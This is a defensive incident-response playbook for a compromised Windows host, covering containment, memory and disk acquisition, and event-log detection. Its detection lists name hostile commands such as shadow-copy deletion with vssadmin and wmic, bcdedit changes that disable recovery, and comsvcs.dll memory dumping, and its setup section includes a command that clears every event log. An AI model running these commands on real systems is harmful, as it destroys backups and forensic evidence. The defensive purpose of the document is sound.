# Windows - Compromised Host

This playbook describes the steps to perform containment, analysis and recovery on a compromised Windows instance. Please note that it is assumed that the forensics and test instances are being deployed in a Google Cloud (GCP) environment, hence `gcloud` commands are provided for deploying, containing instances. 

The exact same concepts can be applied for other environments.

## Pre-requisites

### Forensics Instance Setup

#### Windows

For the Forensics instance, we deploy a Windows instance using the following command in `GCP` as an example:

```
# Deploy a windows forensics instance of type Windows Server 2022 DC edition, in project `citric-snow-362912` and disk size of 60GB
gcloud compute instances create windows-forensics-instance \
    --project=citric-snow-362912 \
    --zone=us-central1-c \
    --machine-type=e2-standard-4 \
    --network-interface=network-tier=PREMIUM,stack-type=IPV4_ONLY,subnet=default \
    --maintenance-policy=MIGRATE \
    --provisioning-model=STANDARD \
    --service-account=507227860050-compute@developer.gserviceaccount.com \
    --scopes=https://www.googleapis.com/auth/devstorage.read_only,https://www.googleapis.com/auth/logging.write,https://www.googleapis.com/auth/monitoring.write,https://www.googleapis.com/auth/servicecontrol,https://www.googleapis.com/auth/service.management.readonly,https://www.googleapis.com/auth/trace.append \
    --create-disk=auto-delete=yes,boot=yes,device-name=instance-20240421-220752,image=projects/windows-cloud/global/images/windows-server-2022-dc-v20240415,mode=rw,size=60,type=projects/citric-snow-362912/zones/us-central1-c/diskTypes/pd-balanced \
    --tags=rdp-server \
    --no-shielded-secure-boot \
    --shielded-vtpm \
    --shielded-integrity-monitoring \
    --labels=goog-ec-src=vm_add-gcloud \
    --reservation-affinity=any
```

Ensure that access to RDP port is enabled via the network tag `rdp-server` to be able to connect to the instance:
```
gcloud compute firewall-rules create rdp-server \
    --network "default" \
    --direction ingress \
    --allow=tcp:3389 \
    --target-tags=rdp-server \
    --description "Allow RDP port 3389 for accessing Windows servers"
```

Connect via RDP to the Forensics instance and launch Powershell as an Administrator. Then, execute the [script](./InstallForensicsDeps.ps1) which will install all the necessary forensic tools discussed here. The script can also be modified to install most dependencies on a USB stick instead by editing the `INSTALL_LOCATION` variable.

Live memory images or disk images taken from the compromised instance can then be attached to the instance for analysis. Alternatively, USB sticks can be attached to the instance for live analysis.

#### Ubuntu
For the Forensics instance, we deploy an Ubuntu 22.04 instance by following the steps [here](../gcp_compromised_pod#ubuntu). Live memory images or disk images taken from the compromised instance can then be attached to this instance for analysis

### Scenario Setup

To setup the scenario which can be explored, we deploy a Windows server and enable Sysmon with it using the sysmon config file available [here](https://gist.github.com/manasmbellani/1baccb274e6deae15befd0a736ad8f36/raw/sample-sysmon-config.xml)

```
C:\Users\Administrator\Desktop\opt\sysinternals\Sysmon64.exe -accepteula -i C:\Users\Administrator\Desktop\opt\sysmon-config\sample-sysmon-config.xml
```

Additionally, we enable powershell logging via powerhshell:
```
Write-Host "[*] Enabling Module Logging..."
New-Item -Path "Registry::HKLM\SOFTWARE\Wow6432Node\Policies\Microsoft\Windows\PowerShell" -Force
New-Item -Path "Registry::HKLM\SOFTWARE\Wow6432Node\Policies\Microsoft\Windows\PowerShell\ModuleLogging" -Force
New-Item -Path "Registry::HKLM\SOFTWARE\Wow6432Node\Policies\Microsoft\Windows\PowerShell\ModuleLogging\ModuleNames" -Force
New-ItemProperty -Path "HKLM:\SOFTWARE\Wow6432Node\Policies\Microsoft\Windows\PowerShell\ModuleLogging\ModuleNames" -Name "*" -Value "*" -PropertyType "String" -Force

Write-Host "[*] Enabling Scriptblock Logging..."
New-Item -Path "Registry::HKLM\SOFTWARE\Wow6432Node\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Force
New-ItemProperty -Path "HKLM:\SOFTWARE\Wow6432Node\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value "1" -PropertyType "DWORD" -Force
```

To clear windows audit event logs to start afresh, we run the following command:
```
wevtutil el | Foreach-Object {wevtutil cl "$_"}
```

Setup the Active Directory Certificate Services for practice as required by following the steps in the guide [here](https://campus.barracuda.com/product/websecuritygateway/doc/112167659/how-to-install-ad-cs-on-windows-server/) and setup the logging for Active Directory Certificate Services by following this guide [here](https://www.pkisolutions.com/enabling-active-directory-certificate-services-adcs-advanced-audit/). 

The server roles to install and configure in addition to `Certification Authority (CA)` are:
- Certification Authority
- Certificate Enrollment Policy Web Service
- Certificate Enrollment Web Service
- Certificate Authority Web Enrollment

Configure a new certificate by following the steps [here](https://thesecmaster.com/blog/step-by-step-procedure-to-create-a-custom-csr-on-a-windows-server) to generate a CSR and receive a certificate.

Change the Group Policy to enable logging to be enabled for ADCS services as described [here](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/dn786422(v=ws.11)):

```
certutil –setreg CA\AuditFilter 127
net stop certsvc && net start certsvc
```

This would then allow the CA settings to be logged via the GPO / Local Security Policy as described [here](https://www.pkisolutions.com/enabling-active-directory-certificate-services-adcs-advanced-audit/):

```
Write-Host "[*] Enabling Object Access (including ADCS if enabled) audit policy..."
$command='& auditpol /set /category:"Object Access" /subcategory:"Certification Services" /success:enable /failure:enable'
Invoke-Expression "$command"
```

Ensure that auditing is set for all events under `certsrv.msc` > `Certification Authority` > Right-Click > Auditing > `Events to Audit`

Auditing should also be enabled for certificate templates via `ADSI Edit > Action > Connect to... > Select 'Configuration' in Naming Context instead of Default > CN=Services > CN=Public Key Services > CN=Certificate Templates`

## Containment

### Disconnect from wired networks

Remove ethernet cables AND other accessories e.g. desktop extenders which may have ethernet cables connected  to them.

### Disable IP networks

#### via netsh

List all the network interfaces

```
netsh interface show interface
```

Disable the specific network interaces

```
netsh interface set interface $INTERFACE_NAME admin=disabled
```

#### via powershell / Get-NetAdapter

List the network adapters:
```
Get-NetAdapter
```

Disable the specific network adapters:
```
Disable-NetAdapter -Name "$ADAPTER_NAME" -Confirm:$false
```

### Forget wireless networks

#### via netsh

Forget wireless networks

```
# Windows 10
netsh wlan delete profile name=* i=*

# OS earlier than Windows 10
netsh wlan delete profile *
```

### Disable BlueTooth Networks

#### via UI

Find option in the task bar to disable bluetooth network.

### Disable User Account

#### via powershell / Active Directory

```
Disable-ADAccount -Identity $UserName
```

## Collection

### Collect Live RAM 

#### via Belkasoft

To collect live RAM, we can leverage the `Belkasoft RAM Capturer` available from download [here](https://belkasoft.com/ram-capturer) and initiate the appropriate x64 bin from a remote USB disk. The memory image is then stored on this remote disk too, say `F:`

#### via DumpIT

Alternatively, we can also leverage `DumpIt.exe` provided by `Magnet Forensics` as part of its `Comae Toolkit` available [here](https://www.magnetforensics.com/resources/magnet-dumpit-for-windows/) to collect live RAM from the compromised host for analysis.
```
.\DumpIt.exe
```

#### via FTK Imager

```
"C:\Program Files\AccessData\FTK Imager\FTK Imager.exe" > File > Capture Memory > Select Destination Path (e.g. C:\Windows\TEMP) > Include Pagefile.sys
```

#### via winpmem

```
# Run as administrator for x64 system
C:\Users\Administrator\Desktop\opt\winpmem\winpmem_mini_x64_rc2.exe C:\Windows\Temp\physmem.raw

# Run as administrator for x86 system
C:\Users\Administrator\Desktop\opt\winpmem\winpmem_mini_x86.exe C:\Windows\Temp\physmem.raw
```

#### via velocirpator

Access GUI via https://127.0.0.1:8889, and leverage `Windows.Memory.Acquisition` to collect memory. Uses `winpmem` in the background to collect live memory.

##### deploying velocirpator 

In GUI Mode:
```
cd C:\Users\Administrator\Desktop\opt\velociraptor
velociraptor.exe gui
```

### Collect Disk Image

#### via FTK Imager

Can be used to create various disk types such as Raw Image (`dd`), Smart, E01 (Autopsy/Encase compatible) and AFF.
```
"C:\Program Files\AccessData\FTK Imager\FTK Imager.exe" > File > Create Disk Image > Physical Drive
```

For folders (e.g. `Kape` disk artifacts below ), can create `AD1` type disk image

#### via dc3dd

Identify the `PHYSICALDRIVE` image identifier to create disk of using FTK Imager [here](#via-ftk-imager-1)

Run `dc3dd` command to take an image to specified folder:

```
C:\Users\Administrator\Desktop\opt\dc3dd\dc3dd-dcfl-win7-64-7-2-641\dc3dd.exe if=\\.\PHYSICALDRIVE0 of=C:\Windows\Temp\disk.dd hash=sha256 log=C:\Windows\Temp\disk.log
```

Taken from [here](https://www.forensicfocus.com/articles/windows-drive-acquisition/)

### Collect Windows Event Logs

#### via powershell

Use [Get-WinEvtxLogs.ps1](Get-WinEvtxLogs.ps1) script to retrieve the logs on the device

### Collect Disk Artifacts

#### via Kroll (KAPE)

KAPE can also be run from a USB stick as described [here](https://threatintelligencelab.com/tools/step-by-step-guide-to-forensically-acquiring-logs-with-kape/#:~:text=Insert%20USB%20Drive%3A%20Plug%20the,selecting%20%E2%80%9C%20Run%20as%20Administrator%20%E2%80%9C.)

```
cd C:\Users\Administrator\Desktop\opt\kape\KAPE
.\kape.exe --sync

# Perform most important file collection on a disk to a specific destination. Leverage .\gkape.exe to build the command (without 'Flush' ideally)
.\kape.exe --tsource C: --tdest C:\Windows\Temp --target !SANS_Triage --gui
```

See [FTK Imager](#via-ftk-imager) for more information on how to create disk images (AD1) .

#### via velociraptor

Follow the steps [here](##deploying-velocirpator) to launch velociraptor > start `Hunt` on targets via `Windows.KapeFiles.Targets` to collect Kapefiles > Select `_SANS_Triage`

#### via WINTri

```
cd C:\Users\Administrator\Desktop\opt\WINTri
.\WINTri.ps1
```

Taken from [here](https://github.com/DCScoder/WINTri)

### Mount Disks

#### via FTK Imager

Can be used to mount both physical (e.g. E01) and logical disks

#### via linux / ewfmount

Can be used to mount disk in Linux host

```
ewfmount charlie-work-usb-2009-12-11.e01 /mnt/disk

mkdir /mnt/disk /mnt/windows_data

# Find sector where NTFS partition starts (this is *512 bytes)
mmls  /mnt/disk/ewf1
mount -t ntfs-3g -o loop,ro,show_sys_files,stream_interface=windows,offset=$((1*512)) /mnt/disk/ewf1 /mnt/windows_mount
```

To unmount:

```
umount /mnt/windows_mount
umount /mnt/disk
```

Taken from [here](https://dfirmadness.com/mounting-case001-e01-files/)

### Detect Encrypted Disks

#### via Magnet Forensics' Encrypted Disk Detector

Good to know if disks are encrypted beforehand during collection steps since encrypted disks may lose more volatile data than non-encrypted disks as described [here](https://www.raedts.biz/forensics/should-you-pull-the-plug/)

```
C:\Users\Administrator\Desktop\opt\encrypted-disk-detector\encrypted-disk-detector.exe
```

### Export Emails for Analysis

Assuming the compromise could have started using phishing emails.

#### for Office 365

Refer to this [link](../azure_compromised_account/README.md#extract-emails-for-analysis) for details on how to export emails for analysis e.g. in case of phishing sites.

## Analysis

This section covers a variety of techniques which can be used for both live and offline analysis.

In case of live analysis, we have ability to connect a USB stick to the contained instance with tools running on the USB stick. 

Note that majority of the steps described in `Offline / Disk Analysis` could be performed in `Live Analysis` as well by copying the binaries to the USB stick and attaching it to the compromised instance.

### Detection for unusual active directory services changes

- Can detect changes to Active Directory Group Services

#### via Windows Audit Event Logs / 5136

```
# Look for changes from unusual 'Subject.Account Name' 
EventID = 5136 (A directory service object was modified)
Channel = Security
```

### Detection for unusual Credential Manager Reads

- Can detect Mimikatz `vault::read` attempts to credentials saved in memory 
  
#### via Windows Audit Event Logs

```
# Captures 
EventID = 5379 (Credential Manager credentials were read)
Channel = Security
```


### Detection for unusual account changes

Can detect activites, like:
- Addition of Service Principal Names (SPNs) aka `Force SPN Set` (even though the service principal name added may not be shown)
  

#### via windows event logs / 4738

```
EventID = 4738 (A user account was changed)
Channel = Security
```

### Detection for unusual user password resets

- Can be indicative of password resets via commands like `net.exe`

#### via Windows Event Logs / Event ID 4738

```
# Monitor the `Password Last Set` date for changes
EventID = 4738 (A User's account was changed)
Channel = Security
```
  
#### via Windows Event Logs / Event ID 4724

```
# Target Account.Account Name is the username on which the password was reset
EventID = 4724 (An attempt was made to reset a user's password) 
Channel = Security
```

### Detection for unusual computer password resets

Sometimes this activity can be common e.g. on DCs every 30 days as per [0xbandar](https://0xbandar.medium.com/detecting-the-cve-2020-1472-zerologon-attacks-6f6ec0730a9e)
- If surrounded by event ID 5805 (provider=NETLOGON, Channel=System, Level=Error) with description `The session setup from the computer .......... failed to authenticate. The following error occurred: Access is denied`, then it could indicate successful `ZeroLogon` exploit (CVE-2020-1472) as per [0xbandar](https://0xbandar.medium.com/detecting-the-cve-2020-1472-zerologon-attacks-6f6ec0730a9e). Also, `Account Name` would be `ANONYMOUS LOGON`

#### via Windows Event Logs / Event ID 4742

```
EventID=4742 (A computer account was changed)
Changed Attributes.PasswordLastSet = *
```

### Detection for unusual DLLs / images loaded

Look for artifacts like: 
```
# For .NET Assembly executions in memory against the same processID or process 
ImageLoaded: *\clrjit.dll AND ImageLoaded: *\clr.dll
```

#### via Windows Audit Sysmon Event Logs / Event ID 7

```
# Look for .NET Assembly executions
EventID: 7 (Image Loaded)
Provider: Microsoft-Windows-Sysmon
ImageLoaded: <See above>
```



### Detection for unusual URLs / browsing activity

#### via Microsoft Windows Defender Advanced Threat Hunting

```
# Internet Explorer
DeviceNetworkEvents
| where DeviceName contains "testvm2"
| where InitiatingProcessFileName == "iexplore.exe"
| sort by Timestamp desc

# Microsoft Edge
DeviceNetworkEvents
| where DeviceName contains "testvm2"
| where InitiatingProcessFileName == "msedge.exe"
| sort by Timestamp desc

# Google Chrome
DeviceNetworkEvents
| where DeviceName contains "testvm2"
| where InitiatingProcessFileName == "chrome.exe"
| sort by Timestamp desc
```

Taken from [here](https://techcommunity.microsoft.com/t5/microsoft-defender-for-endpoint/get-users-browser-history-via-live-response/m-p/3950769)

#### via History files

```
# Safari
/Users/[USERNAME]/Library/Safari/History.db

# Chrome
```

### Detection for creation of unusual Shadow Copies

Can detect the following scenarios: 
- `Backup Operators` abuse as described [here](https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet?tab=readme-ov-file#abusing-backup-operators-group)

#### via Windows Event ID / Event ID 8222

```
# Look for unusual 'Process Image Name' values in the Description of the event and unusual Users that are not expected to perform this activity.
Provider=VSSAudit
EventID=8222 (Shadow copy has been created.)
```

### Detect for unusual Windows DNSServer Activity Logs

#### via Windows Audit Event Logs / 541

Can detect `DNSAdmins` abuse by overwriting of serverlevelplugindll on scope pointing to malicious DLL path

```
Event ID = 541
Channel = Microsoft-Windows-DNSServer/Audit
Provider = Microsoft-Windows-DNSServer
Description = "serverlevelplugindll on scope . has been set to $ARBITRARY_DLL_PATH"
```

### Detect for unusual Windows services creations

Monitor for usage of new services which can be indicative of persistence techniques e.g. via modification of binary to system, dnsadmins
Some unusual service names can be: 
```
# Indicates a pivoting tunnel  from cloudflare, called cloudflared. See https://x.com/malmoeb/status/1736995855482118314?s=46&t=WvGY79Umt5enRwgCbi4TQQ, https://www.guidepointsecurity.com/blog/tunnel-vision-cloudflared-abused-in-the-wild/
CloudFlared agent
```

#### via Windows Sysmon Event Logs / 13

```
# replace $SERVICE_NAME to be anything 
EventID=13 (Registry value set)
Image=C:\Windows\system32\services.exe
Provider=Microsoft-Windows-Sysmon/Operational
TargetObject=HKLM\System\CurrentControlSet\Services\$SERVICE_NAME\Start
```

#### via Windows Event Logs / 7045 / 7036 / 7040 / 4697
```
# Look for 'DNS Server' service name (e.g. has it entered the `start` state or not) for `DNSAdmins` abuse
EventID=7045 (service was installed on system) OR EventID=7040 (The start type of the ... service was changed from auto start to demand start) OR EventID=7036 (The ... service entered the stopped state.)
Provider=Service Control Manager
OR 
EventID=4697 (A service was installed in the system)
Provider=Microsoft-Windows-Security-Auditing
```

### Detect unusual file share usage

Monitor for usage of shares like `ADMIN$`, `IPC$`, `C$` and unusual file names which can be indicative of PsExec being used for access within the environment for file staging. See more info [here](https://research.splunk.com/endpoint/f63c34fe-a435-11eb-935a-acde48001122/)

#### via Windows Event Audit Logs / Event ID 5145

```
# 'Share Name' is the name of the share, and 'Relative Target Name' is the name of the file in the share
EventID=5145
Provider=Microsoft-Windows-Security-Auditing
```

### Detect unusual usb device insertions

Can display malicious disks being inserted into the device

#### via Windows Event Audit Logs / EventID 1006

```
# Contains Capacity, Model, Serial #
EventID=1006
Provider=Windows-Diagnostic-Parition
```

More info [here](https://mreerie.com/2022/02/05/bitlocker-connected-storage-devices/)

#### via Windows Event Audit Logs / EventID 6416

Detects USB Device Name, USB Device ID

```
EventID=6416
Provider=Microsoft-Windows-Security-Auditing
```

More info [here](https://www.manageengine.com/products/active-directory-audit/process-tracking-events/event-id-6416.html#:~:text=When%20the%20system%20recognizes%20a,event%20ID%206416%20is%20logged.)

#### via Windows Event Audit Logs / EventID 1, 4688

Look for keyword in file paths e.g.  `E:\.....png` 

### Detect startup programs

#### via autorunsc64

```
# Pre-requisite: Requires Arsenal Image Mounter to take an image of the system
autorunsc64.exe -a * -c -h -s '*' -z C:\Windows C:\Users\Administrator
```

Taken from [here](https://www.sans.org/blog/offline-autoruns-revisited-auditing-malware-persistence/)

### Look for interesting indicators in data 

#### via bulk_extractor

See [here](../linux_compromised_host/README.md#look-for-interesting-indicators-in-data)

### Detect for unusual powershell sessions

Look for interesting keywords in commands OR in powershell:

```
# interesting argument in commands normally observed
powershell.exe  -ExecutionPolicy Bypass

# Could be Intune based powershell execution / malware delivery: https://cloud.google.com/blog/topics/threat-intelligence/lightshow-north-korea-unc2970/
powershell.exe -NoProfile -executionPolicy bypass -file "C:\Program Files (x86)\Microsoft Intune Management Extension\Policies\Scripts\$GUID.../"

# To invoke commands on one or more computers
# Powershell remoting e.g. Invoke-Command -ComputerName $computer -ScriptBlock { ...<powershell code> } -ArgumentList ...
Invoke-Command -ComputerName $computer ...
```

#### via powershell module logging / event ID 4103

Usually 4104 (ScriptBlock text) ok for most unusual detections, Can be used to detect bypass for ScriptBlock logging attempts as documented in [dfir.ch](https://dfir.ch/posts/scriptblock_smuggling/)

```
Event ID = 4103 (CommandInvocation)
Channel = Microsoft-Windows-Powershell/Operational 
```

#### via windows process logging / event ID 1 with powershell.exe or pwsh.exe  

See [here](#detect-for-unusual-processes-and-parent-processes-created)

#### via powershell scriptblock logging / event ID 4104

```
# Look for TargetFileName, ProcessID fields (Process that created the key) AND Target Object
Event ID = 4104 (Creating ScriptBlock text)
Channel = Microsoft-Windows-PowerShell/Operational
```

Example Elastic Search:
```
cloud.instance.name:dc AND winlog.event_id:* AND (event.code:1 OR event.code:4104)
```

### Detect for unusual processes and parent processes created

- Identify signs of lateral movement via various tools such as `imapcket` via Parent Command Line and Command Line [Purp1eW0lf](https://github.com/Purp1eW0lf/Blue-Team-Notes)
- Processes and parent process names to look for:
```
powershell.exe
# Suspicious VBS Executions. See https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1059.005/
cscript.exe
# Javascript execution. See https://detection.fyi/mbabinski/sigma-rules/2023_redcanary_threatdetectionreport/threat_gootloader_appdata_js_execution/
wscript.exe
# MSHTA Execution
mshta.exe
cmd.exe
pwsh.exe
schtasks.exe
scrcons.exe
regsvr32.exe
hh.exe

# Eg for deleting volume shadow copies: wmic.exe Shadowcopy Delete
wmic.exe
mshta.exe
msiexec.exe
bitsadmin.exe
certutil.exe

# Can be used by sysadmins OR even by backupoperators for malicious purposes. See: https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet?tab=readme-ov-file#abusing-backup-operators-group
diskshadow

# RDP / VNC connectivity possible
ngrok.exe
winvnc.exe

# https://medium.com/@0xcc00/bypassing-edr-ntds-dit-protection-using-blueteam-tools-1d161a554f9f
FTKImager.exe

# https://medium.com/@0xcc00/bypassing-edr-ntds-dit-protection-using-blueteam-tools-1d161a554f9f
DumpIt.exe

# Lateral movement detection via wmi with unusual commands, such as `cmd.exe /q /c [command] 1> \\127.0.0.1\admin$\__[file] 2>&1`
# Taken from: https://labs.withsecure.com/publications/attack-detection-fundamentals-discovery-and-lateral-movement-lab-5
wmiprvse.exe

# See detection [here](#detection-of-winrm-shell--powershell-remote-session) for Windows Powershell remoting
wsmprovhost.exe

# Ransomware related command eg sc config "Netbackup Legacy Network service" start= disabled	
sc

# Ransomware command lines e.g. `bcdedit   /set {default}`, bcdedit   /set {default} recoveryenabled No to disable automatic repair
# References: https://www.tenforums.com/tutorials/90923-enable-disable-automatic-repair-windows-10-a.html
bcdedit

# Look for indications of back volume shadow copies being deleted eg vssadmin.exe Delete Shadows /all /quiet 
# OR vssadmin  create shadow /for=C: for shadow copy creation for dumping hashes
vssadmin.exe

# Identified WERFault as parent process in image file execution options execution.
# More info here: https://pentestlab.blog/2020/01/13/persistence-image-file-execution-options-injection/#:~:text=Image%20File%20Execution%20Options%20is,%E2%80%9CGlobalFlag%E2%80%9D%20for%20application%20debugging.
werfault.exe

# eg comsvcs.dll being leveraged to dump memory dump files. See https://lolbas-project.github.io/lolbas/Libraries/comsvcs/
rundll32

# Legitimate binaries being created by unusual processes eg. running in Downloads, Temp folder
# Can be indicative of Process Hollowing as seen in `Run of the Mill` `Ace Responder` exercise e.g
C:\Users\Administrator\Downloads\explore.exe -> C:\Windows\System32\notepad.exe OR iexplore.exe (Internet Explorer)

# Detection of PrintNightmare vulnerability (CVE-2021-1675) where print spooler process executes unusual DLLs
# Provider = Microsoft-Windows-PrintService/Admin, EventCode=808 shows the DLL being executed ("The print spooler failed to load a plug-in module...")
# https://www.splunk.com/en_us/blog/security/i-pity-the-spool-detecting-printnightmare-cve-2021-34527.html
C:\Windows\System32\spoolsv.exe -> C:\Windows\System32\rundll.exe
```

Taken from here: [1](https://github.com/SigmaHQ/sigma/blob/master/other/godmode_sigma_rule.yml), [2](https://detection.fyi/sigmahq/sigma/windows/process_creation/proc_creation_win_susp_shell_spawn_susp_program/)

#### via Windows Event Logs / Sysmon / Event ID 1

```
# Look for TargetFileName, ProcessID fields (Process that created the key) AND Target Object
Event ID = 1 (Process Create)
Channel = Microsoft-Windows-Sysmon/Operational
```

#### via Windows Event Logs / Event ID 4688

```
# Look for New Process Name, New Process ID fields 
Event ID = 4688 (A new process has been created)
Channel = Security
```

### Detect for process injection / migration into another process

#### via Windows Sysmon Event Logs / CreateRemoteThreat (EventID 8)

```
Channel = Microsoft-Windows-Sysmon/Operational
Event ID = 8 (CreateRemoteThread)
```

More info [here](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread)

### Detect for unusual file changes 

Key files to look for include:

```
# Persistence locations
C:\Users\USERNAME\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs
C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\vbsstartup.vbs

# Taken from: https://github.com/DCScoder/Noisy-Cricket/blob/main/Noisy_Cricket.ps1
C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\

# Files being copied across aka exfiltration e.g. to `E:` drives as seen in `Airgapped` in `Aceresponder` challenge will create file in `E:` or other drive letters.
Search: event.code:11 AND winlog.event_data.TargetFilename: "E:"
```

#### via Windows Event Logs / Sysmon / Event ID 11

```
# Look for TargetFileName, ProcessID fields (Process that created the key) AND Target Object
Event ID = 11 (File Create)
Channel = Microsoft-Windows-Sysmon/Operational
```

### Detect unusual registry key created or updates

Keys to look for include: 
```
# Boot or Logon Autostart Execution: Registry Run Keys, https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1547.001/T1547.001.md#atomic-test-1---reg-key-run
HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend

# Persistence Mechanism via registry keys: https://github.com/DCScoder/Noisy-Cricket/blob/main/Noisy_Cricket.ps1
HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnceEx
HKLM:\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders
HKLM:\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders
HKLM:\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run

# AutoProxyTypes, taken from: https://www.hexacorn.com/blog/2017/10/05/beyond-good-ol-run-key-part-66/
HKCR\AutoProxyTypes

# Look for changes to 'Security Packages' in the registry below to detect custom SSP creation
# Taken from: https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet?tab=readme-ov-file#custom-ssp
HKLM\System\CurrentControlSet\Control\Lsa\OSConfig\
HKLM\System\CurrentControlSet\Control\Lsa\

# Persistence Mechansims via Registry keys taken from: https://github.com/persistence-info/persistence-info.github.io/blob/main/Data/diskcleanuphandler.md
`HKCR\CLSID\{52A2AAAE-085D-4187-97EA-8C30DB990436}\InprocServer32`
`HKCR\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}\shell\`
`HKCR\CLSID`
`HKCU\Control Panel\Desktop`
`HKCU\Environment`
`HKCU\Environment` set `UserInitMprLogonScript`
`HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`
`HKCU\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services`
`HKCU\Software\Microsoft\Command Processor\AutoRun`
`HKCU\Software\Microsoft\HtmlHelp Author`
`HKCU\Software\Microsoft\Windows NT\CurrentVersion\Windows`
`HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce`
`HKCU\txtfile\shell\open\command`
`HKLM\SOFTWARE\Classes\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}\shell\`
`HKLM\SOFTWARE\Classes\CLSID`
`HKLM\SOFTWARE\Classes`
`HKLM\SOFTWARE\Microsoft\AMSI\Providers`
`HKLM\SOFTWARE\Microsoft\Cryptography\OID`
`HKLM\SOFTWARE\Microsoft\Cryptography\Providers`
`HKLM\SOFTWARE\Microsoft\NetSh`
`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AeDebug`
`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\TelemetryController`

# Detect Image File Execution Option Persistence
# More info: https://pentestlab.blog/2020/01/13/persistence-image-file-execution-options-injection/#:~:text=Image%20File%20Execution%20Options%20is,%E2%80%9CGlobalFlag%E2%80%9D%20for%20application%20debugging.
`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\`
`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options`
'HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit'

`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\GPExtensions`
`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`
`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon` registry key, the exe will be loaded by the `winlogon.exe`
`HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\MyComputer`
`HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\VolumeCaches\`
`HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services`
`HKLM\SYSTEM\CurrentControlSet\Control\BootVerificationProgram`
`HKLM\SYSTEM\CurrentControlSet\Control\LsaExtensionConfig\LsaSrv`
`HKLM\SYSTEM\CurrentControlSet\Control\Lsa`
`HKLM\SYSTEM\CurrentControlSet\Control\NetworkProvider\Order`
`HKLM\SYSTEM\CurrentControlSet\Control\Print\Monitors`
`HKLM\SYSTEM\CurrentControlSet\Control\Session Manager`
`HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\StartupPrograms`
`HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp`
`HKLM\SYSTEM\CurrentControlSet\Services\<...>\NetworkProvider`
`HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters`
`HKLM\SYSTEM\CurrentControlSet\Services\WinSock2\Parameters\AutodialDLL`
`HKLM\SYSTEM\CurrentControlSet\Services`
`HKLM\Software\Classes`
`HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify`
`HKLM\Software\Microsoft\Windows\Windows Error Reporting\Hangs\ Debugger = <executable>`
`HKLM\Software\Microsoft\Windows\Windows Error Reporting\Hangs`
`HKLM\System\CurrentControlSet\Control\ContentIndex\Language\English_UK`
`HKLM\System\CurrentControlSet\Control\ContentIndex\Language\English_US`
`HKLM\System\CurrentControlSet\Control\ContentIndex\Language\Neutral`
`HKLM\System\CurrentControlSet\Control\ContentIndex\Language`

# Detect DNSAdmins abuse where ServerLevelPluginDll contains the path to the DLL
HKLM:\SYSTEM:\CurrentControlSet:\services\DNS\Parameters\ServerLevelPluginDll
```

#### via Windows Event Logs / Sysmon / Event ID 13

```
# Look for Image, ProcessID fields (Process that created the key) AND Target Object, which is the registry key set
Event ID = 13 (Registry Value Set)
Channel = Microsoft-Windows-Sysmon/Operational
```

### Detect successful network sessions

- A session is recorded when a user at a client successfully contacts a server
- A successful session occurs when the two computers are on the same network and the user has a user name and password that are accepted by the server. 

#### via net

```
net view \\127.0.0.1
```

### Detect Windows SMB Shares Exposed on the network

#### via powershell / Get-SmbShare

```
Get-SmbShare
```

#### via net

```
net view \\127.0.0.1
```

### Detection of WinRM Shell / PowerShell Remote Session

Detects if someone is using Invoke-PSRemoting based commands or `evil-winrm`

#### via Powershell / Get-WSManInstance

```
# Run on the local host where shell was created
# Shows the username, clientIP from which connections came
# Use [System.XML.XmlConvert]::toTimeSpan(...) to convert ShellRuneTime and other attributes
Get-WSManInstance -ResourceUri Shell -Enumerate
```

Taken from [here](https://jdhitsolutions.com/blog/powershell/7712/answering-the-wsman-powershell-challenge/)

#### via Windows Sysmon Event Logs / 4688 (A new process has been created)

```
Provider = Microsoft-Windows-Security-Auditing
EventID = 4688
New Process Name = *\wsmprovhost.exe
```

#### via Windows Sysmon Event Logs / 1 (Process Create)

```
Channel = Microsoft-Windows-Sysmon/Operational
EventID = 1 (Process Create)
CommandLine = "C:\Windows\system32\wsmprovhost.exe*"
```

#### via Windows Event Logs / 91 (Creating WSMan shell)

```
